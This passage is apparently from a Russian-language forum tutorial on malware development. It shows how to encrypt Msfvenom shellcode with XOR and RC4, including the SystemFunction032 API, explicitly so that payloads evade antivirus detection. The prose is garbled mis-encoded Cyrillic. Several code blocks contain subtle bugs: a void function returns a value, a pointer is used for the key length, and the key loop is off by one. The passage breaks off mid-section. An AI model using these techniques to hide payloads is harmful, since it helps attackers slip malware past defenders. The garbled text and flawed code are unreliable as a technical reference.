–¢–∞–∫ –∫–∞–∫ pTmpBuffer —Ç–µ–ø–µ—Ä—å —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ –æ–±–ª–∞—Å—Ç—å –ø–∞–º—è—Ç–∏, –≤ –∫–æ—Ç–æ—Ä–æ–π –º–æ–∂–Ω–æ –∑–∞–ø–∏—Å—ã–≤–∞—Ç—å –∏ –∫–æ—Ç–æ—Ä–∞—è —Å–æ–¥–µ—Ä–∂–∏—Ç –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É, —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è –≤–æ–∑–º–æ–∂–Ω—ã–º —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –∏–ª–∏ –≤–Ω–µ—Å—Ç–∏ –≤ –Ω–µ–µ –ª—é–±—ã–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è.<br />
<br />
–ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –Ω–∏–∂–µ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç shellcode Msfvenom, —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–π –≤ —Ä–∞–∑–¥–µ–ª–µ —Ä–µ—Å—É—Ä—Å–æ–≤.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732483536.png"
		data-src="https://osint42.org/attachments/1746732483536-png.70/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732483536-png.70/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732483536.png"
			title="1746732483536.png"
			width="1660" height="1080" loading="lazy" />
	</div><br />
<br />
–ü—Ä–æ–¥–æ–ª–∂–∞—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ, –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –≤–æ –≤—Ä–µ–º–µ–Ω–Ω–æ–º –±—É—Ñ–µ—Ä–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732512417.png"
		data-src="https://osint42.org/attachments/1746732512417-png.71/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732512417-png.71/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732512417.png"
			title="1746732512417.png"
			width="1533" height="1076" loading="lazy" />
	</div></div>
						

							<h2>–®–∏—Ñ—Ä—É–µ–º Payload</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746773556787.png"
		data-src="https://osint42.org/attachments/1746773556787-png.72/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773556787-png.72/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773556787.png"
			title="1746773556787.png"
			width="450" height="230" loading="lazy" />
	</div><br />
<br />
–í –ø—Ä–µ–¥—ã–¥—É—â–µ–π —Å—Ç–∞—Ç—å–µ –º—ã —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–ª–∏ –≥–¥–µ —Ö—Ä–∞–Ω–∏—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É (Payload), –Ω–æ –∫–∞–∫ –±—ã–ª–æ —Å–∫–∞–∑–∞–Ω–æ –≤ –∫–æ–º–µ–Ω—Ç–∞—Ä–∏–∏ –∫ —Å—Ç–∞—Ç—å–µ, –¥–ª—è –æ–±—Ö–æ–¥–∞ –¥–µ—Ç–µ–∫—Ç–∞ –Ω—É–∂–Ω–æ –º–Ω–æ–≥–æ —á–µ–≥–æ —Å–¥–µ–ª–∞—Ç—å, –≤ —á–∞—Å—Ç–Ω–æ—Å—Ç–∏ –Ω—É–∂–Ω–æ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞—Ç—å Payload –∏ –µ—â—ë –ø–æ–∑–∞–±–æ—Ç–∏—Ç—Å—è –æ–± –∞–Ω—Ç–∏—ç–º—É–ª—è—Ü–∏–∏ –∏ —Å–∫—Ä—ã—Ç–∏—è –ø–æ–≤–µ–¥–µ–Ω–∏—è.<br />
<br />
–í —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º –ø–æ–∫–∞-—á—Ç–æ –∫–∞–∫ —à–∏—Ñ—Ä–æ–≤–∞—Ç—å.)<br />
<br />
<b>–®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º XOR</b><br />
<br />
–®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º XOR —è–≤–ª—è–µ—Ç—Å—è —Å–∞–º—ã–º –ø—Ä–æ—Å—Ç—ã–º –≤ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ –∏ –ª–µ–≥–∫–∏–º –≤ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏, —á—Ç–æ –¥–µ–ª–∞–µ—Ç –µ–≥–æ –ø–æ–ø—É–ª—è—Ä–Ω—ã–º –≤—ã–±–æ—Ä–æ–º –¥–ª—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º. –û–Ω–æ –±—ã—Å—Ç—Ä–µ–µ, —á–µ–º AES –∏ RC4, –∏ –Ω–µ —Ç—Ä–µ–±—É–µ—Ç –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫ –∏–ª–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è API Windows. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, —ç—Ç–æ —Å–∏–º–º–µ—Ç—Ä–∏—á–Ω—ã–π –∞–ª–≥–æ—Ä–∏—Ç–º —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –æ–¥–Ω—É –∏ —Ç—É –∂–µ —Ñ—É–Ω–∫—Ü–∏—é –∫–∞–∫ –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è, —Ç–∞–∫ –∏ –¥–ª—è –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è.<br />
<br />
<b>–®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ XOR</b> –ü—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç –±–∞–∑–æ–≤—É—é —Ñ—É–Ω–∫—Ü–∏—é —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è XOR. –§—É–Ω–∫—Ü–∏—è –ø—Ä–æ—Å—Ç–æ –ø—Ä–∏–º–µ–Ω—è–µ—Ç –æ–ø–µ—Ä–∞—Ü–∏—é XOR –∫ –∫–∞–∂–¥–æ–º—É –±–∞–π—Ç—É —à–µ–ª–ª–∫–æ–¥–∞ —Å 1-–±–∞–π—Ç–æ–≤—ã–º –∫–ª—é—á–æ–º.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>/*
    - pShellcode : Base address of the payload to encrypt
    - sShellcodeSize : The size of the payload
    - bKey : A single arbitrary byte representing the key for encrypting the payload
*/
VOID XorByOneKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) {
    for (size_t i = 0; i &lt; sShellcodeSize; i++){
        pShellcode[i] = pShellcode[i] ^ bKey;
    }
}</code></pre>
	</div>
</div><br />
<b>–î–æ–ø–æ–ª–Ω–µ–Ω–∏–µ:</b> –•–æ—Ç—è XOR –æ–±–ª–∞–¥–∞–µ—Ç –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–º–∏ –ø—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞–º–∏ –≤ –≤–∏–¥–µ —Å–∫–æ—Ä–æ—Å—Ç–∏ –∏ –ø—Ä–æ—Å—Ç–æ—Ç—ã, –æ–Ω –Ω–µ —Å—á–∏—Ç–∞–µ—Ç—Å—è –±–µ–∑–æ–ø–∞—Å–Ω—ã–º –¥–ª—è –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–∞ —Å–µ—Ä—å–µ–∑–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è. –ï—Å–ª–∏ –∞—Ç–∞–∫—É—é—â–∏–π –∏–º–µ–µ—Ç –¥–æ—Å—Ç—É–ø –∫ –∏—Å—Ö–æ–¥–Ω–æ–º—É –∏ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–º—É —Ç–µ–∫—Å—Ç–∞–º, –æ–Ω –º–æ–∂–µ—Ç –ª–µ–≥–∫–æ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∫–ª—é—á. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, –µ—Å–ª–∏ –æ–¥–∏–Ω –∏ —Ç–æ—Ç –∂–µ –∫–ª—é—á –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –º–Ω–æ–≥–æ–∫—Ä–∞—Ç–Ω–æ, —ç—Ç–æ —Ç–∞–∫–∂–µ –º–æ–∂–µ—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ —É—è–∑–≤–∏–º–æ—Å—Ç—è–º.<br />
<br />
<b>–ó–∞—â–∏—Ç–∞ –∫–ª—é—á–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è</b><br />
<br />
–ù–µ–∫–æ—Ç–æ—Ä—ã–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –∏ —Ä–µ—à–µ–Ω–∏—è –ø–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –º–æ–≥—É—Ç –ø–æ–¥–±–∏—Ä–∞—Ç—å –∫–ª—é—á –º–µ—Ç–æ–¥–æ–º –≥—Ä—É–±–æ–π —Å–∏–ª—ã, —á—Ç–æ –ø–æ–∑–≤–æ–ª–∏—Ç —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å —à–µ–ª–ª–∫–æ–¥. –ß—Ç–æ–±—ã —É—Å–ª–æ–∂–Ω–∏—Ç—å –ø–æ–¥–±–æ—Ä –∫–ª—é—á–∞ —ç—Ç–∏–º –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º, –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –Ω–∏–∂–µ –∫–æ–¥ –≤–Ω–æ—Å–∏—Ç –Ω–µ–∑–Ω–∞—á–∏—Ç–µ–ª—å–Ω—ã–µ –∏–∑–º–µ–Ω–µ–Ω–∏—è, —É–≤–µ–ª–∏—á–∏–≤–∞—è –∫–ª—é—á–µ–≤–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –∑–∞ —Å—á–µ—Ç –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π i –∫ –∫–ª—é—á—É. –¢–µ–ø–µ—Ä—å, –∫–æ–≥–¥–∞ –∫–ª—é—á–µ–≤–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –∑–Ω–∞—á–∏—Ç–µ–ª—å–Ω–æ –±–æ–ª—å—à–µ, –≥–æ—Ä–∞–∑–¥–æ —Å–ª–æ–∂–Ω–µ–µ –ø–æ–¥–æ–±—Ä–∞—Ç—å –∫–ª—é—á –º–µ—Ç–æ–¥–æ–º –≥—Ä—É–±–æ–π —Å–∏–ª—ã.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>/*
    - pShellcode : –ë–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è
    - sShellcodeSize : –†–∞–∑–º–µ—Ä –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
    - bKey : –û–¥–∏–Ω –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–π –±–∞–π—Ç, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—é—â–∏–π –∫–ª—é—á –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
*/
VOID XorByiKeys(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) {
    for (size_t i = 0; i &lt; sShellcodeSize; i++) {
        pShellcode[i] = pShellcode[i] ^ (bKey + i);
    }
}</code></pre>
	</div>
</div><br />
–ü—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –≤—ã—à–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –≤—Å–µ –∂–µ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å –±–æ–ª–µ–µ –Ω–∞–¥–µ–∂–Ω—ã–º. –í —Å–ª–µ–¥—É—é—â–µ–º —Ñ—Ä–∞–≥–º–µ–Ω—Ç–µ –∫–æ–¥–∞ –ø—Ä–æ—Ü–µ—Å—Å —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –æ—Å—É—â–µ—Å—Ç–≤–ª—è–µ—Ç—Å—è —Å –∫–ª—é—á–æ–º, –∏—Å–ø–æ–ª—å–∑—É—è –∫–∞–∂–¥—ã–π –±–∞–π—Ç –∫–ª—é—á–∞ –ø–æ–≤—Ç–æ—Ä–Ω–æ, —á—Ç–æ —É—Å–ª–æ–∂–Ω—è–µ—Ç –≤–∑–ª–æ–º –∫–ª—é—á–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>/*
    - pShellcode : –ë–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è
    - sShellcodeSize : –†–∞–∑–º–µ—Ä –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
    - bKey : –°–ª—É—á–∞–π–Ω—ã–π –º–∞—Å—Å–∏–≤ –±–∞–π—Ç–æ–≤ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–≥–æ —Ä–∞–∑–º–µ—Ä–∞
    - sKeySize : –†–∞–∑–º–µ—Ä –∫–ª—é—á–∞
*/
VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
    for (size_t i = 0, j = 0; i &lt; sShellcodeSize; i++, j++) {
        if (j &gt; sKeySize){
            j = 0;
        }
        pShellcode[i] = pShellcode[i] ^ bKey[j];
    }
}</code></pre>
	</div>
</div><br />
<b>–ó–∞–∫–ª—é—á–µ–Ω–∏–µ</b><br />
<br />
–†–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ XOR –¥–ª—è –Ω–µ–±–æ–ª—å—à–∏—Ö –∑–∞–¥–∞—á, —Ç–∞–∫–∏—Ö –∫–∞–∫ —Å–∫—Ä—ã—Ç–∏–µ —Å—Ç—Ä–æ–∫.<br />
–û–¥–Ω–∞–∫–æ –¥–ª—è –±–æ–ª–µ–µ –∫—Ä—É–ø–Ω—ã—Ö –ø–æ–ª–µ–∑–Ω—ã—Ö –Ω–∞–≥—Ä—É–∑–æ–∫ —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ–ª–µ–µ –±–µ–∑–æ–ø–∞—Å–Ω—ã–µ –º–µ—Ç–æ–¥—ã —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è, —Ç–∞–∫–∏–µ –∫–∞–∫ AES.<br />
<br />
<b>–®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ - RC4</b><br />
<br />
–í–≤–µ–¥–µ–Ω–∏–µ RC4 - —ç—Ç–æ –±—ã—Å—Ç—Ä—ã–π –∏ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã–π –ø–æ—Ç–æ–∫–æ–≤—ã–π —à–∏—Ñ—Ä, –∫–æ—Ç–æ—Ä—ã–π —Ç–∞–∫–∂–µ —è–≤–ª—è–µ—Ç—Å—è —Å–∏–º–º–µ—Ç—Ä–∏—á–Ω—ã–º –∞–ª–≥–æ—Ä–∏—Ç–º–æ–º —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è, –ø–æ–∑–≤–æ–ª—è—é—â–∏–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –æ–¥–Ω—É –∏ —Ç—É –∂–µ —Ñ—É–Ω–∫—Ü–∏—é –∫–∞–∫ –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è, —Ç–∞–∫ –∏ –¥–ª—è –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è.<br />
<br />
–ï—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–π RC4 –Ω–∞ C, –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –ø—É–±–ª–∏—á–Ω–æ, –Ω–æ –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ  –±—É–¥—É—Ç –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω—ã —Ç—Ä–∏ —Å–ø–æ—Å–æ–±–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è RC4.<br />
<br />
–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ: –≥–ª–∞–≤–Ω–∞—è —Ü–µ–ª—å —ç—Ç–æ–π —Å—Ç–∞—Ç—å–∏ - –Ω–µ –≤–Ω–∏–∫–∞—Ç—å –≤ –¥–µ—Ç–∞–ª–∏ —Ä–∞–±–æ—Ç—ã –∞–ª–≥–æ—Ä–∏—Ç–º–∞ RC4, –∞ —à–∏—Ñ—Ä–æ–≤–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –¥–ª—è –∏–∑–±–µ–∂–∞–Ω–∏—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è.<br />
<br />
<b>RC4 –®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ - –ú–µ—Ç–æ–¥ 1</b><br />
<br />
–°—É—â–µ—Å—Ç–≤—É—é—Ç –¥–≤–µ —Ñ—É–Ω–∫—Ü–∏–∏ rc4Init –∏ rc4Cipher, –∫–æ—Ç–æ—Ä—ã–µ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã rc4context –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è RC4 —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct
{
    unsigned int i;
    unsigned int j;
    unsigned char s[256];

} Rc4Context;


void rc4Init(Rc4Context* context, const unsigned char* key, size_t length)
{
    unsigned int i;
    unsigned int j;
    unsigned char temp;

    // Check parameters
    if (context == NULL || key == NULL)
        return ERROR_INVALID_PARAMETER;

    // Clear context
    context-&gt;i = 0;
    context-&gt;j = 0;

    // Initialize the S array with identity permutation
    for (i = 0; i &lt; 256; i++)
    {
        context-&gt;s[i] = i;
    }

    // S is then processed for 256 iterations
    for (i = 0, j = 0; i &lt; 256; i++)
    {
        //Randomize the permutations using the supplied key
        j = (j + context-&gt;s[i] + key[i % length]) % 256;

        //Swap the values of S[i] and S[j]
        temp = context-&gt;s[i];
        context-&gt;s[i] = context-&gt;s[j];
        context-&gt;s[j] = temp;
    }

}


void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length){
    unsigned char temp;

    // Restore context
    unsigned int i = context-&gt;i;
    unsigned int j = context-&gt;j;
    unsigned char* s = context-&gt;s;

    // Encryption loop
    while (length &gt; 0)
    {
        // Adjust indices
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;

        // Swap the values of S[i] and S[j]
        temp = s[i];
        s[i] = s[j];
        s[j] = temp;

        // Valid input and output?
        if (input != NULL &amp;&amp; output != NULL)
        {
            //XOR the input data with the RC4 stream
            *output = *input ^ s[(s[i] + s[j]) % 256];

            //Increment data pointers
            input++;
            output++;
        }

        // Remaining bytes to process
        length--;
    }

    // Save context
    context-&gt;i = i;
    context-&gt;j = j;
}</code></pre>
	</div>
</div><br />
–ü—Ä–∏–º–µ—Ä —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>    // Initialization
    Rc4Context ctx = { 0 };

    // Key used for encryption
    unsigned char* key = &quot;ru-sfera.pw&quot;;
    rc4Init(&amp;ctx, key, sizeof(key));

    // Encryption //
    // plaintext - The payload to be encrypted
    // ciphertext - A buffer that is used to store the outputted encrypted data
    rc4Cipher(&amp;ctx, plaintext, ciphertext, sizeof(plaintext));</code></pre>
	</div>
</div><br />
–ü—Ä–∏–º–µ—Ä —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// Initialization
    Rc4Context ctx = { 0 };

    // Key used to decrypt
    unsigned char* key = &quot;ru-sfera.pw&quot;;
    rc4Init(&amp;ctx, key, sizeof(key));

    // Decryption //
    // ciphertext - Encrypted payload to be decrypted
    // plaintext - A buffer that is used to store the outputted plaintext data
    rc4Cipher(&amp;ctx, ciphertext, plaintext, sizeof(ciphertext));</code></pre>
	</div>
</div><br />
<b>RC4 –®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ - –ú–µ—Ç–æ–¥ 2</b><br />
<br />
–ù–µ—É–¥–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–π Windows NTAPI SystemFunction032 –ø—Ä–µ–¥–ª–∞–≥–∞–µ—Ç –±–æ–ª–µ–µ –±—ã—Å—Ç—Ä—É—é –∏ –º–µ–Ω—å—à—É—é —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é –∞–ª–≥–æ—Ä–∏—Ç–º–∞ RC4.<br />
<br />
<b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ SystemFunction032 –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è —Å –ø–æ–º–æ—â—å—é RC4</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è SystemFunction032 –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –Ω–µ—É–¥–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ API Windows, –∫–æ—Ç–æ—Ä–æ–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é –∞–ª–≥–æ—Ä–∏—Ç–º–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è RC4. –ù–µ—Å–º–æ—Ç—Ä—è –Ω–∞ —Ç–æ —á—Ç–æ —ç—Ç–æ API –Ω–µ –¥–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–æ Microsoft, –æ–Ω–æ —à–∏—Ä–æ–∫–æ –∏–∑–≤–µ—Å—Ç–Ω–æ –∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞–º–∏ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è, –≤ —Ç–æ–º —á–∏—Å–ª–µ –±–ª–∞–≥–æ–¥–∞—Ä—è —Ç–∞–∫–∏–º –ø—Ä–æ–µ–∫—Ç–∞–º, –∫–∞–∫ Wine, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Å–≤–µ–¥–µ–Ω–∏—è –æ–± —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏.<br />
<br />
<b>SystemFunction032</b><br />
<br />
–í —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏–∏ —Å –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–µ–π –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ Wine API, —Ñ—É–Ω–∫—Ü–∏—è SystemFunction032 –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –¥–≤–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ —Ç–∏–ø–∞ USTRING.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS SystemFunction032
(
 struct ustring* data,
const struct ustring* key
)</code></pre>
	</div>
</div><br />
<b>–°—Ç—Ä—É–∫—Ç—É—Ä–∞ USTRING</b><br />
<br />
